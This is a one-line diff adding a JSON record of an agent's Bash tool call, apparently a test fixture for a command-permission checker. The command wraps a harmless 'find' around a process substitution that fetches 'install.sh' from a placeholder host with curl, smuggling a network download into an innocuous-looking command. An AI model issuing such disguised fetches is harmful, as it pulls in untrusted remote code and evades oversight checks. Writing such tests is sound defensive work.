@@ -1,0 +1,1 @@
+{"tool_name": "Bash", "tool_input": {"command": "find . -name a.txt < <(curl -s https://example.invalid/install.sh)"}}
